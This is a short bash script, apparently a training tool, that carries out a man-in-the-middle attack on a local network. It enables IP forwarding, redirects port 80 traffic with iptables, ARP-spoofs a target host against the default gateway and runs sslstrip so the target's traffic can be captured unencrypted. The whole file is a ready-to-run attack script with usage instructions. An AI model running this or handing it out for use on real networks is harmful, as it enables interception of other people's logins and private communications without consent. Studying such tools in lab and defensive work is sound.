#!/bin/bash

RED='\033[1;31m'
BLUE='\033[1;34m'
GREEN='\033[1;32m'
YELLOW='\033[49;93m'
NC='\033[0m' # No Color

echo -e "${YELLOW}"
echo -e "+---_----------------------------------------------+"
echo -e "|  Adversarial Informatics Combat MITM SSL Strip   |"
echo -e "|               cygienesolutions.com               |"
echo -e "|  [Usage]: ./mitm_sslstrip_aic.sh <INF> <TARGET>  |"
echo -e "+-------------------------------------------------+"
echo -e "${NC}"
if [ $# == 0 ] ; then
    echo -e "${GREEN}"
    echo -e "Description:"
    echo -e "Successful execution will arp spoof and sslstrip the data"
    echo -e "between the target and the gateway, resulting in intercepted"
    echo -e "unencrypted traffic.  The default gateway is automatically configured."
    echo -e ""
    echo -e "[Usage]: ./mitm_sslstrip_aic.sh eth0 192.168.1.44"
    echo -e "${NC}"
    exit 1; fi

INTERFACE="$1"
TARGET="$2"
GATEWAY=$(ip route | grep default | awk '{print $3}')

#Configure IP Forward
echo -e "${GREEN}"
echo -e "Configuring IP Forwarding..."
echo -e "${NC}"
sysctl -w net.ipv4.ip_forward=1
echo -e "Done."

#Configure PORT Redirect to 8080 using IP Tables...
echo -e "${GREEN}"
echo -e "Configuring Port Redirect to TCP/8080 using iptables..."
echo -e "${NC}"
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
echo -e "Done."

#Default GW Spoof (Backgrounded)
echo -e "${GREEN}"
echo -e "Executing ARP Spoof between Target: $TARGET and Gateway: $GATEWAY..."
echo -e "${NC}"
arpspoof -i $INTERFACE -t $TARGET $GATEWAY > /dev/null 2>&1 &

#Default GW Spoof (Backgrounded)
echo -e "${GREEN}"
echo -e "Starting SSL Strip..."
echo -e "${NC}"
sslstrip -l 8080

echo -e "{Ӧ Support Free Info Ӧ}"
echo -e "${NC}"


